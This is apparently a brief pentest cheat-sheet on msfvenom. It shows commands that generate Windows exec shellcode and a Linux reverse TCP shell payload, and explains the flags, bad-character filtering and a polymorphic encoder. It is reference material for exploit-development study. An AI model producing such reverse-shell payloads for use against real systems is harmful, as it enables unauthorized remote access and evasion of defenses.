


Metasploit framework for crafting shellcode payloads. Combination of **msfpayload** and **msfencode**  
  
  
Ex:  
```bash
msfvenom -p windows/exec CMD="cmd.exe" EXITFUNC=thread -f raw -b "<bad chars>" > shellcode
```

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<localIP> LPORT=<localPort> -b "\x00\x20" -f py -v shellcode

```
  

**-p** - Payload (tab complete enabled)  
**-e** - Encoding (most common = x86/shikata_ga_nai --- A polymorphic encoder)  
**-b** - Specifies bad characters  
**-f** - Specifies output format  
**-v** - Specifies name of the variable  
  
**LHOST=** - local IP for reverse shells  
**LPORT=** - local port to connect to for reverse shells  
**EXITFUNC=thread** - utilized ExitThread API to prevent crashing the service completely assuming the exploited app is threaded,